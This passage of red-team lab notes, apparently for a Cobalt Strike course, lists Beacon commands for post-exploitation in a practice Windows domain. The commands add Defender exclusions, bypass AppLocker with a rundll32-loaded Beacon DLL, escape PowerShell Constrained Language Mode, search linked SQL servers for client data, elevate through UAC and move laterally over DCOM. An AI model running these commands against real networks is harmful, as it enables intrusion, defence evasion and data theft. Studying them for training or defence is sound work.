	beacon> remote-exec winrm dc-2 Get-MpPreference | select Exclusion*

- If the exclusions are configured via GPO and you can find the corresponding Registry.pol file, you can read them with Parse-PolFile:
	PS C:\Users\Administrator\Desktop> Parse-PolFile .\Registry.pol

- add your own exclusions:
	Set-MpPreference -ExclusionPath "<path>"
```

###### <font style="color:#00b3ff">AppLocker</font> 
```
- The default rule sets are quite trivial to bypass in a number of ways:
	Executing untrusted code via trusts LOLBAS's.
	Finding writeable directories within "trusted" paths.
	By default, AppLocker is not even applied to Administrator

- Cobalt Strike can output Beacon to a DLL that can be run with rundll32:
  C:\>C:\Windows\System32\rundll32.exe
  C:\Users\Administrator\Desktop\beacon.dll,StartW
```

###### <font style="color:#00b3ff">PowerShell Constrained Language Mode</font> 
```
- $ExecutionContext.SessionState.LanguageMode will show the language mode of the executing process:
	beacon> remote-exec winrm dc-1 $ExecutionContext.SessionState.LanguageMode

- if we find an AppLocker bypass rule in order to execute a Beacon, powerpick can be used to execute post-ex tooling outside of CLM. powerpick is also compatible with powershell-import:
	beacon> run hostname
	beacon> powerpick $ExecutionContext.SessionState.LanguageMode
	beacon> powerpick [math]::Pow(2,10)
```

###### <font style="color:#00b3ff">File Shares</font> 
```
- Find-DomainShare will find SMB shares in a domain and -CheckShareAccess will only display those that the executing principal has access to:
	beacon> powershell Find-DomainShare -ComputerDomain cyberbotic.io -CheckShareAccess
```

###### <font style="color:#00b3ff">Internal Web Apps</font> 
```
- EyeWitness is a tool capable of identifying (and taking screenshots of) web apps from a list of targets:

	root@kali:/opt/EyeWitness/Python# proxychains4 ./EyeWitness.py --web -f /root/targets.txt -d /root/dev --no-dns --no-prompt

	PS C:\Users\Administrator\Desktop> pscp -r root@kali:/root/dev .
```

###### <font style="color:#00b3ff">Databases</font> 
```
- PowerUpSQL Get-SQLColumnSampleDataThreaded, can search one or more instances for databases that contain particular keywords in the column names:
	beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "project" -SampleSize 5 | select instance, database, column, sample | ft -autosize

- This can only search the instances you have direct access to, it won't traverse any SQL links. To search over the links use Get-SQLQuery:
	beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select * from information_schema.tables')"

	beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select column_name from master.information_schema.columns')"

	beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select top 5 OrgNumber from master.dbo.VIPClients')
```

###### <font style="color:#00b3ff">Elevate Kit</font> 
```
- After we've loaded elevate.cna:
	beacon> elevate
	beacon> elevate uac-schtasks tcp-local
```

###### <font style="color:#00b3ff">Jump and Remote-Exec</font> 
```
- Invoke DCOM:
	beacon> jump dcom srv-1 smb
```

- Malleable C2 profiles: used for network artifacts, customizing HTTP traffic

---


